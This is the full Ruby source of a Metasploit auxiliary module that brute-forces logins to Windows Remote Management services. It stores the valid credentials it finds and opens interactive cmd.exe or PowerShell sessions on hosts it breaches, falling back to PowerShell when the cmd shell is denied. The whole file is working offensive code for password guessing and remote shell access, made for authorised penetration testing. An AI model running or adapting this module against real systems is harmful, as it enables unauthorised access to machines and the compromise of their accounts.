##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner'
require 'metasploit/framework/login_scanner/winrm'
require 'net/winrm/connection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::WinRM
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::CommandShell
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::Kerberos::Ticket::Storage
  include Msf::Sessions::CreateSessionOptions
  include Msf::Auxiliary::ReportSummary

  def initialize
    super(
      'Name' => 'WinRM Login Utility',
      'Description' => %q{
        This module attempts to authenticate to a WinRM service. It currently
        works only if the remote end allows Negotiate(NTLM) authentication.
        Kerberos is not currently supported.  Please note: in order to use this
        module without SSL, the 'AllowUnencrypted' winrm option must be set.
        Otherwise adjust the port and set the SSL options in the module as appropriate.
      },
      'Author' => [ 'thelightcosine', 'smashery' ],
      'References' => [
        [ 'CVE', '1999-0502'], # Weak password
        [ 'ATT&CK', Mitre::Attack::Technique::T1021_006_WINDOWS_REMOTE_MANAGEMENT ]
      ],
      'License' => MSF_LICENSE
    )

    register_options(
      [
        OptEnum.new(
          'SessionType',
          [
            true,
            'The WinRM shell type to create when CreateSession is enabled',
            'cmd',
            %w[cmd powershell auto]
          ]
        )
      ]
    )
  end

  def run
    check_winrm_parameters
    super
  end

  def run_host(ip)
    cred_collection = build_credential_collection(
      realm: datastore['DOMAIN'],
      username: datastore['USERNAME'],
      password: datastore['PASSWORD']
    )

    kerberos_authenticator_factory = nil
    if datastore['Winrm::Auth'] == Msf::Exploit::Remote::AuthOption::KERBEROS
      kerberos_authenticator_factory = lambda do |username, password, realm|
        Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::HTTP.new(
          host: datastore['DomainControllerRhost'],
          hostname: datastore['Winrm::Rhostname'],
          proxies: datastore['Proxies'],
          realm: realm,
          username: username,
          password: password,
          timeout: 20,
          framework: framework,
          framework_module: self,
          cache_file: datastore['Winrm::Krb5Ccname'].blank? ? nil : datastore['Winrm::Krb5Ccname'],
          mutual_auth: true,
          use_gss_checksum: true,
          ticket_storage: kerberos_ticket_storage,
          offered_etypes: Msf::Exploit::Remote::AuthOption.as_default_offered_etypes(datastore['Winrm::KrbOfferedEncryptionTypes']),
          clock_skew: kerberos_clock_skew_seconds
        )
      end
    end

    keep_connection_alive = datastore['CreateSession']

    scanner = Metasploit::Framework::LoginScanner::WinRM.new(
      configure_login_scanner(
        host: ip,
        port: rport,
        proxies: datastore['Proxies'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 10,
        framework: framework,
        framework_module: self,
        kerberos_authenticator_factory: kerberos_authenticator_factory,
        keep_connection_alive: keep_connection_alive
      )
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id
      )
      if result.success?
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        print_good "#{ip}:#{rport} - Login Successful: #{result.credential}"
        if datastore['CreateSession']
          http_client = result.connection
          rhost = result.host
          rport = result.port
          uri = datastore['URI']
          schema = result.service_name
          ssl = schema == 'https' # Can't trust the datastore value, because the scanner does some *magic* to set it for us
          endpoint = "#{schema}://#{rhost}:#{rport}#{uri}"
          conn = Net::MsfWinRM::RexWinRMConnection.new(
            {
              endpoint: endpoint,
              host: rhost,
              port: rport,
              proxies: datastore['Proxies'],
              uri: uri,
              ssl: ssl,
              user: result.credential.public,
              password: result.credential.private,
              transport: :rexhttp,
              no_ssl_peer_verification: true,
              operation_timeout: 1, # For the WinRM server
              timeout: 20, # For the underlying HTTP client
              retry_delay: 1,
              realm: result.credential.realm,
              http_client: http_client
            }
          )
          create_winrm_session(conn, result.credential, rhost, rport, endpoint)
        end
      else
        invalidate_login(credential_data)
        vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
      end
    end
  end

  def create_winrm_session(conn, credential, rhost, rport, endpoint)
    case datastore['SessionType']
    when 'cmd'
      _status, session = setup_cmd_session(conn, rhost, rport, endpoint, credential, suggest_powershell: true)
      session
    when 'powershell'
      setup_powershell_session(conn, rhost, rport, endpoint, credential)
    when 'auto'
      status, session = setup_cmd_session(conn, rhost, rport, endpoint, credential, suggest_powershell: false)
      return session if status == :created
      return unless status == :access_denied

      print_status "#{rhost}:#{rport} - Falling back to a WinRM PowerShell session because cmd shell CreateShell was denied"
      setup_powershell_session(conn, rhost, rport, endpoint, credential)
    end
  end

  def setup_cmd_session(conn, rhost, rport, endpoint, credential, suggest_powershell:)
    begin
      shell = conn.shell(:stdin, {})
    rescue WinRM::WinRMWSManFault => e
      return handle_cmd_shell_fault(e, rhost, rport, nil, credential, suggest_powershell: suggest_powershell)
    end

    setup_cmd_shell(shell, rhost, rport, endpoint, credential, suggest_powershell: suggest_powershell)
  end

  def session_setup(shell, rhost, rport, endpoint)
    _status, session = setup_cmd_shell(shell, rhost, rport, endpoint, nil, suggest_powershell: true)
    session
  end

  def setup_cmd_shell(shell, rhost, rport, _endpoint, credential, suggest_powershell:)
    # Keep cmd.exe as the default for the existing stdin-backed CommandShell
    # behavior and older hosts. Historically, PowerShell v3 on Windows Server
    # 2012 and earlier did not reliably return stdout/stderr through WinRM.
    begin
      interactive_process_id = shell.send_command('cmd.exe')
    rescue WinRM::WinRMWSManFault => e
      return handle_cmd_shell_fault(e, rhost, rport, shell, credential, suggest_powershell: suggest_powershell)
    end

    sess = Msf::Sessions::WinrmCommandShell.new(shell, interactive_process_id)
    sess.platform = 'windows'
    username = credential_username(credential)
    password = credential_password(credential)
    info = "WinRM #{username}:#{password} (#{shell.owner})"
    merge_me = {
      'USERNAME' => username,
      'PASSWORD' => password
    }

    [:created, start_session(self, info, merge_me, false, nil, sess)]
  end

  def setup_powershell_session(conn, rhost, rport, _endpoint, credential)
    begin
      shell = conn.shell(:powershell)
      owner = powershell_owner(shell)
    rescue WinRM::WinRMWSManFault => e
      print_error "#{rhost}:#{rport} - PowerShell runspace CreateShell failed: #{e.fault_description}"
      elog(e.full_message, error: e)
      return nil
    end

    sess = Msf::Sessions::WinrmPowerShell.new(shell)
    username = credential_username(credential)
    password = credential_password(credential)
    info = "WinRM PowerShell #{username}:#{password}"
    info = "#{info} (#{owner})" unless owner.blank?
    merge_me = {
      'USERNAME' => username,
      'PASSWORD' => password
    }

    start_session(self, info, merge_me, false, nil, sess)
  end

  def powershell_owner(shell)
    owner = nil
    shell.run('[System.Security.Principal.WindowsIdentity]::GetCurrent().Name') do |stdout, stderr|
      owner ||= stdout.to_s.lines.first&.strip unless stdout.blank?
      vprint_error(stderr.to_s.strip) unless stderr.blank?
    end
    owner
  end

  def handle_cmd_shell_fault(error, rhost, rport, shell, credential, suggest_powershell:)
    if cmd_shell_access_denied?(error)
      user = shell_user(shell, credential)
      msg = "Credentials were correct, but WinRM cmd shell CreateShell was denied for user: #{user}"
      msg = "#{msg}. Try setting SessionType to powershell or auto." if suggest_powershell
      print_warning "#{rhost}:#{rport} - #{msg}"
      wlog(error.fault_description)
      return [:access_denied, nil]
    end

    print_error "#{rhost}:#{rport} - #{error.fault_description}"
    elog(error.full_message, error: error)
    [:failed, nil]
  end

  def cmd_shell_access_denied?(error)
    error.fault_code == ::WindowsError::Win32::ERROR_ACCESS_DENIED.value.to_s
  end

  def shell_user(shell, credential)
    shell&.connection_opts&.fetch(:user, nil) || credential_username(credential)
  end

  def credential_username(credential)
    credential&.public || datastore['USERNAME']
  end

  def credential_password(credential)
    credential&.private || datastore['PASSWORD']
  end

  def start_session(obj, info, ds_merge, _crlf = false, _sock = nil, sess = nil) # rubocop:disable Style/OptionalBooleanParameter
    sess.set_from_exploit(obj)
    sess.info = info

    # Clean up the stored data
    sess.exploit_datastore.merge!(ds_merge)

    framework.sessions.register(sess)
    sess.process_autoruns(datastore)

    # Notify the framework that we have a new session opening up...
    # Don't let errant event handlers kill our session
    begin
      framework.events.on_session_open(sess)
    rescue ::Exception => e # rubocop:disable Lint/RescueException
      wlog("Exception in on_session_open event handler: #{e.class}: #{e}")
      wlog("Call Stack\n#{e.backtrace.join("\n")}")
    end

    sess
  end

  def test_request
    return winrm_wql_msg('Select Name,Status from Win32_Service')
  end
end
